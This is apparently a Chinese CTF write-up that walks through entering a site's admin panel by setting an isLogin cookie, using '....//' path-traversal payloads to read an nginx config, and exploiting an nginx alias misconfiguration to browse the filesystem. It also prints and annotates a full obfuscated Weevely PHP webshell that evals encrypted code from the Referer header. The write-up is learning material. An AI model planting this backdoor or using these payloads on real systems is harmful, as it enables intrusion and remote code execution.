+<p> &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf 说文件的配置可能有问题,该文件应该是nginx的站点核心配置文件之一</p>
+<p><strong>Hack.php</strong></p>
+<p>访问改文件得到一个空白页面,猜测改文件没有直接输出任何语句</p>
+<p><strong>&#x2F;admin | &#x2F;admin&#x2F; |&#x2F;ad,im&#x2F;?&#x2F;login | &#x2F;admin&#x2F;index.php</strong>都显示</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208977.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646466402867"></p>
+
+<p><strong>&#x2F;admin&#x2F;admin.php</strong></p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208987.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646466466802"></p>
+
+<p> 弹窗显示 <strong><code>you need to log in</code></strong> , 然后跳转到 <code>login.php</code> 页面 </p>
+<p><strong>&#x2F;images</strong></p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208178.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646466558803"></p>
+
+<p>会跳转到&#x2F;images&#x2F;并返回403,没有可以利用的点</p>
+<p>基本信息收集的差不多之后,我们现在有几个可以用的点</p>
+<ol>
+<li><strong>&#x2F;admin&#x2F;admin.php页面</strong></li>
+</ol>
+<p>该页面需要登录情况下才能访问,但是我们没有账号和密码,也没有注册页面,所以账号和密码登录是不太现实的.同样爆破账号密码也不太可能.现在最理想的情况是那个地方泄露了cookie,我们可以利用这个cookie以某个用户的身份进行登录</p>
+<p>​    2. <strong>&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf 文件</strong></p>
+<p>这个文中给出的提示,肯定有用,但是现在无法去读取这个文件,最常用的读取文件漏洞有”文件包含”与”任意文件下载(读取)”,但是需要找到可以利用的点</p>
+<p>​    3.<strong>Hack.php页面</strong></p>
+<p>暂时还不知道是怎么利用但是看文件名字肯定可以利用</p>
+<h2 id="本地文件包含读取Nginx配置文件"><a href="#本地文件包含读取Nginx配置文件" class="headerlink" title="本地文件包含读取Nginx配置文件"></a>本地文件包含读取Nginx配置文件</h2><p>这里发现在访问网址时都会带上一个isLogin的cookie,这里没有任何问题,但是isLogin的值被定义为”0”<img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208184.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646467732253"></p>
+
+<p>想到cookie是用来识别用户的,维持登录状态的,这里的”0”可能表示布尔值,因此手动将其该为”isLogin&#x3D;1”</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208193.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646468011826"></p>
+
+<p> 然后再访问 <code>/admin/admin.php</code> , 发现我们成功登录到了站点后台 </p>
+<p>后台看起来有很多选项卡 , 其实大部分都是假的 , 即使有几个选项存在页面跳转 , 也都是指向 <code>index.php</code> , 没有什么问题 .</p>
+<p>在登录时发现请求了这么一个界面</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208476.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646468601366"></p>
+
+<p>可以发现请求的是后台文件index.php</p>
+<p>其中file参数是文件名,ext参数是文件扩展名,那么这里是否存在LFI(本地文件包含漏洞)</p>
+<ol>
+<li><p><strong>.&#x2F;测试</strong></p>
+<pre><code>payload=file=./index&amp;ext=php
+</code></pre>
+<p> <img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208491.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646469038225"></p>
+
+<p> 2.<strong>..&#x2F;测试</strong></p>
+<pre><code>payload=file=../index&amp;ext=php
+</code></pre>
+<p> <img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208493.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646469112174"></p>
+
+</li>
+</ol>
+<p>响应结果和.&#x2F;完全相同,看起来..&#x2F;并没有被解析处理,或者说是被过滤掉了.</p>
+<p>​    3.<strong>….&#x2F;&#x2F;测试</strong></p>
+<p>​        既然..&#x2F;可能被过滤了,那么就重叠写为….&#x2F;&#x2F;这样如果是只过滤一次,并且过滤为空的话就可以绕过这个过滤</p>
+<pre><code>payload=file=....//&amp;ext=php
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208502.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646469437304"></p>
+
+<p>这里页面就发生了变化不在出现please continue,这里可能因为过滤检测后..&#x2F;index.php文件不存在.导致站点自动跳转到.&#x2F;index.php主页.因此重写法可以绕过..&#x2F;过滤</p>
+<p>​    4.<strong>测试去除ext参数值</strong></p>
+<p>如果HTTP请求中ext&#x3D;php是必须存在且无法更改的,那么这里利用会变得十分困难.因为我们的目标是&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf文件,而不是php文件</p>
+<pre><code>payload=file=index&amp;ext=
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208500.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646469772066"></p>
+
+<p>没有出现please continue,因此这里看到的页面可能是因为当前目录下面的index文件不存在而强制跳转到index.php</p>
+<p>​    5.**测试去除ext参数值,并在file参数中添加文件扩展名</p>
+<p>​        那么如何验证上述没有出现please continue字符串是因为站点中没有找到这个文件而出现的强制跳转这个猜想是正确的呢</p>
+<pre><code>payload=file=index.php&amp;ext=
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208514.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646470053397"></p>
+
+<p>出现了please continue,说明读取到了当前目录下面的index.php,而前面的没有找到这个站点没有读取到index这个文件,直接跳转到了index.php,因此没有出现please continue</p>
+<p>这也说明了我们上面所有的猜想都是正确的.我们可以通过重写..&#x2F;来绕过站点的过滤机制</p>
+<p>现在我们可以直接读取到&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf</p>
+<pre><code>payload = file=....//....//....//....///etc/nginx/sites-enabled/site.conf&amp;ext= 
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208866.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646470290737"></p>
+
+<h2 id="目录遍历漏洞拿到webshel"><a href="#目录遍历漏洞拿到webshel" class="headerlink" title="目录遍历漏洞拿到webshel"></a>目录遍历漏洞拿到webshel</h2><p>利用上面的漏洞,我们可以读取到所有已知文件名的文件,但是我们对于哪些我们不知道的文件,就没有办法读取,必须拿到其他的利用点.所以这里开始查看配置文件根据</p>
+<h3 id="Nginx的alias的用法及与root的区别"><a href="#Nginx的alias的用法及与root的区别" class="headerlink" title="Nginx的alias的用法及与root的区别"></a>Nginx的alias的用法及与root的区别</h3><ol>
+<li>​    toot的用法</li>
+</ol>
+<pre><code>location /request_path/image/ &#123;
+    root /local_path/image/;
+&#125;
+这样配置的结果就是当客户端请求 /request_path/image/cat.png 的时候，
+Nginx把请求映射为/local_path/image/request_path/image/cat.png
+</code></pre>
+<ol start="2">
+<li><p>alias的用法</p>
+<pre><code>location /request_path/image/ &#123;
+    alias /local_path/image/;
+&#125;
+这时候，当客户端请求 /request_path/image/cat.png 的时候，
+Nginx把请求映射为/local_path/image/cat.png
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208876.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646474028650"></p>
+
+</li>
+</ol>
+<p>这段代码给&#x2F;web-img目录设置了一个别名&#x2F;images&#x2F;,并且开启了autoindex</p>
+<p> alias 用于给 localtion 指定的路径设置别名 , 在路径匹配时 , alias 会把 location 后面配置的路径丢弃掉 , 并把当前匹配到的目录指向到 alias 指定的目录 . </p>
+<p>注意!alias会丢弃掉loaction的路径,因此alias后面的路径是从系统根目录开始的,然后直接跟指定的路径,他和root的用法不一样,而autoindex是一个目录浏览功能,用于列出当前目录的所有文件及子目录</p>
+<p>总之,这里访问&#x2F;web-ima,就会访问系统跟目录下的&#x2F;images&#x2F;而如果在url中访问&#x2F;web-img..&#x2F;则相当于访问&#x2F;images&#x2F;..&#x2F;,也就相当于访问系统根目录.而且由于开启了autoindex,我们可以直击在浏览器里看到根目录下的所有内容</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208893.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646474607851"></p>
+
+<p>这就是一个目录遍历漏洞,我们可以通过他查看系统中所有文件</p>
+<p>遍历目录可以在&#x2F;var&#x2F;www下找到hack.php.bak</p>
+<h2 id="分析Weevely-Linux中的菜刀-后门代码"><a href="#分析Weevely-Linux中的菜刀-后门代码" class="headerlink" title="分析Weevely(Linux中的菜刀)后门代码"></a>分析Weevely(Linux中的菜刀)后门代码</h2><p>先定义多个变量,然后通过str_replace函数进行字符串的替换并拼接,接着通过create_fuction()创建了一个匿名函数,最后执行这个函数</p>
+<p>str_replace()函数替换拼接后的代码就是匿名函数$f的内容因此这里输出$f,看看函数在干什么</p>
+<pre><code class="php">&lt;?php
+$U = &#39;_/|U&quot;,&quot;/-/|U&quot;),ar|Uray|U(&quot;/|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle&#39;;
+$q = &#39;s[|U$i]=&quot;&quot;;$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui&#39;;
+$M = &#39;l=&quot;strtolower|U&quot;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$&#39;;
+$z = &#39;r=@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua=@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r&#39;;
+$k = &#39;?:;q=0.([\\|Ud]))?,|U?/&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&quot;|Usubst|Ur&quot;;|U|U$s&#39;;
+$o = &#39;|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r&#39;;
+$N = &#39;|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;/&#39;;
+$C = &#39;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;/$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;&#39;;
+$j = &#39;$k|Uh=&quot;|U|U42f7&quot;;$kf=&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&quot;&quot;;fo|Ur($i=0;$i&lt;&#39;;
+$R = str_replace(&#39;rO&#39;, &#39;&#39;, &#39;rOcreatrOe_rOrOfurOncrOtion&#39;);
+$J = &#39;kf|U),|U0,3));$p=&quot;|U&quot;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$&#39;;
+$x = &#39;r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;/([\\|U|Uw])[|U\\w-]+|U(&#39;;
+$f = str_replace(&#39;|U&#39;, &#39;&#39;, $j . $o . $z . $x . $k . $M . $J . $q . $N . $U . $C);
+echo $f;#这里
+$kh = &quot;42f7&quot;;#定义两个字符串
+$kf = &quot;e9ac&quot;;
+
+function x($t, $k)#$t的每一项和$k的每一项异或运算,然后循环拼接到输出变量$o中
+&#123;
+    $c = strlen($k);
+    $l = strlen($t);
+    $o = &quot;&quot;;
+    for ($i = 0; $i &lt; $l;) &#123;
+        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;
+            echo $t&#123;$i&#125;;
+            $o .= $t&#123;$i&#125; ^ $k&#123;$j&#125;;
+
+        &#125;
+    &#125;
+    return $o;
+&#125;
+#获取服务器环境变量
+$r = $_SERVER;#获取reffer头
+$rr = @$r[&quot;HTTP_REFERER&quot;];#at符号（@）在PHP中用作错误控制操作符。当表达式附加@符号时，将忽略该表达式可能生成的错误消息。如果启用了track_errors功能，则表达式生成的错误消息将保存在变量$ php_errormsg中。每个错误都会覆盖此变量。
+$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];#获取浏览器语言
+if ($rr &amp;&amp; $ra) &#123;
+    #解析url
+    $u = parse_url($rr);
+    /*[query] =&gt; arg=value 这个是查询语句返回的数组中的键值 而下面将查询到的referer中的查询字符串解析为键值对变量,并且保存在数组$q中*/
+    parse_str($u[&quot;query&quot;], $q);
+    #返回$q中的所有值
+    $q = array_values($q);
+    #执行全局的正则匹配表达式,将结果输出到$m数组中,这个可以单独拿出来看
+    preg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;, $ra, $m);
+    /*/([\w])[\w-]+(?:;q=0.([\d]))?,?/
+    \w匹配字母数字下划线
+    [\w]匹配数字字母下划线中的任何字符
+    ([\w]把匹配到的数字字母下划线放到一个分组中
+    [\w-]匹配数字字母下划线与-中的任何字符
+    +表示匹配一个或更多个前面的标记连起来就是匹配不止一个数字字母下划线和-
+    (?:)表示非捕获分组用于单纯的把数个标记组在一起用于后面的?组合匹配
+    ;q=0表示匹配;q=0这些字符
+    .表示匹配任何字符不包括换行符
+    ([\d])\d表示匹配任何数字0-9
+    ?表示匹配0个或一个前面的标记
+    (?:;q=0.([\d]))?综合起来就是匹配;q=0任意字符 数字一次但不捕获
+    ,?表示匹配0次逗号或者一次逗号
+     * */
+    if ($q &amp;&amp; $m) &#123;
+        #屏蔽错误并且开启一个新的session
+        @session_start();
+        #$s也同时可以使用$_SESSION的值 ,两个变量指向一个内容
+        $s =&amp; $_SESSION;
+        $ss = &quot;substr&quot;;
+        $sl = &quot;strtolower&quot;;
+        #拼接前两中语言的首字母
+        $i = $m[1][0] . $m[1][1];
+        #在连接预定义字符串截取0-3位,在进行小写转换
+        $h = $sl($ss(md5($i . $kh), 0, 3));
+        $f = $sl($ss(md5($i . $kf), 0, 3));
+</code></pre>
+<p> 需要注意这个正则函数 <code>preg_match_all()</code> , 该函数从 <code>Accept-Language</code> 取值 , 然后通过正则匹配后输出到 $m 数组中 . 单独拿出来看 , $m 数组的输出内容是如下这样的 .  </p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208898.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646490699195"></p>
+
+<pre><code> $m[0] : 所有可选语言及其权重系数
+ $m[1] : 所有可选语言的首字母
+ $m[2] : 所有可选语言的权重值( 不清楚该怎么说 , 反正你能明白 )
+</code></pre>
+<pre><code> 举个例子 : Accept-Language: zh-cn,zh;q=0.5
+ 
+ 1. Accept-Language表示浏览器所支持的语言类型 . 
+ 2. zh-CN 表示简体中文 , zh 表示中文 , 不同语言之间用逗号分割 .
+ 3. q 是权重系数 , 范围为 [0,1] . q 值越大 , 请求越倾向于获得其对应语言表示的内容 . 若没有指定 q 值，则默认为1 . 若被赋值为0 , 则用于提醒服务器该语言是浏览器不接受的内容类型 .
+</code></pre>
+<p> 然后拼接了前两种可选语言的首字母 , 和预定义的字符串拼接并进行 md5 校验 , 截取等操作 . 然后赋值给 <code>$h</code> 和 <code>$f</code> 两个变量 </p>
+<pre><code class="php">#$p 应该是指payload,现在还为空
+        $p = &quot;&quot;;
+        for ($z = 1; $z &lt; count($m[1]); $z++)
+            # $m[2]是语言权重的整数值
+            $p .= $q[$m[2][$z]];
+        #如果$p 中$h首次出现的位置在开头
+        if (strpos($p, $h) === 0) &#123;
+            $s[$i] = &quot;&quot;;
+            #返回 $p 中的第四个字符到末尾的字符串(即去除$p前三个字符)
+            $p = $ss($p, 3);
+        &#125;
+        #查找数组$s中是否有指定键名$i,即查找$-SESSION中是否存在键名$i
+        if (array_key_exists($i, $s)) &#123;
+            # $_SESSION[$i] = $_SESSION[$i] . $p
+            $s[$i] .= $p;
+            #$e 为$_SESSION[$i] 中$f第一次出现的位置
+            $e = strpos($s[$i], $f);
+</code></pre>
+<p>循环中的 <code>$p .= $q[$m[2][$z]]</code> 会不断从 <code>$q</code> 中提取数据 . 结合之前的代码 , 攻击代码是放在 <code>Referer</code> 中的( 最后会放在 <code>$q</code> 中 ) , 因此这里可以看作是拼接攻击代码 , 组合成 Payload . ‘</p>
+<p>然后判断 $h 是否出现在 Payload 的开头 , 若是则设置 <code>$_SESSION[&#39;$i&#39;] = &quot;&quot;</code>  , 同时删除 Payload 的 $h 部分 . </p>
+<p>接着判断 <code>$_SESSION</code> 中那个是否存在 <code>$i</code> 这个键名 , 若是则将 Payload 赋值给 <code>$_SESSION[$i]</code> , 然后查找 <code>$_SESSION[$i]</code>( 也就是 Payload ) 中 <code>$f</code> 第一次出现的位置 .</p>
+<pre><code class="php"> if ($e) &#123;
+                #$k = 42f7e9ac
+                $k = $kh . $kf;
+                ob_start();
+                /*这段比较复杂
+                $ss($s[i],0,$e) 先删除了$_SESSION[$i] 中的 $f.
+                 preg_replace():将剩余部分中的&#39;_&#39;和&#39;-&#39;替换为&#39;/&#39;和&#39;+&#39;
+                base64_decode():然后对替换后的内容进行base64解码
+                x():接着对其进行那个异或加密,该函数在开头定义了
+                gzuncompress():解压一个压缩字符串
+                最后通过eval执行
+                 * */
+                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;, &quot;/-/&quot;), array(&quot;/&quot;, &quot;+&quot;), $ss($s[$i], 0, $e))), $k)));
+                # 返回输出缓冲区内容到$o
+                $o = ob_get_contents();
+                #清空缓冲区并关闭输出缓冲
+                ob_end_clean();
+                #对缓冲区输入内容通过gzcompress()函数压缩,通过x()异或加密,通过base64编码
+                $d = base64_encode(x(gzcompress($o), $k));
+                print(&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;);
+                #销毁一个会话中的所有数据
+                @session_destroy();
+            &#125;
+        &#125;
+    &#125;
+&#125;
+$g=create_function(&#39;&#39;,$f);
+$g();
+?&gt;
+</code></pre>
+<p>紧跟上面的上面的代码,若payload中找到了$f第一次出现的位置,(也就是说明$f在payload中),就会继续执行如下过程.</p>
+<ol>
+<li>生成密钥$k,该值由预定义的两个字符串拼接而成,然后打开输出控制缓冲区</li>
+<li>截取payload中从开头到$f出现位置的这部分字符串(由此可以判断$f应该是出现在payload的末尾,这里删去$f)</li>
+<li>利用pre_replace()函数,正则替换字符串中的’_’和’-‘为’&#x2F;‘和’+’</li>
+<li>替换后的字符串进行base64_decode解码操作</li>
+<li>对解码后的字符串进行循环异或运算(就是调用x()函数)</li>
+<li>对计算后的字符串调用gzuncompress()函数进行压缩</li>
+<li>通过eval()函数执行压缩后的字符串</li>
+<li>返回输出到缓冲区的内容,然后清空并关闭输出缓冲区</li>
+<li>对缓冲区输出的内容通过gzcompress()函数进行压缩,再通过x()函数进行循环异或运算,最后通过base64_encode编码输出</li>
+</ol>
+<p>整个后门代码的思路就是应该如上,攻击者通过referer传输攻击代码,这段攻击代码的格式应该为填充字符串+加密混淆后的payload+填充字符串.</p>
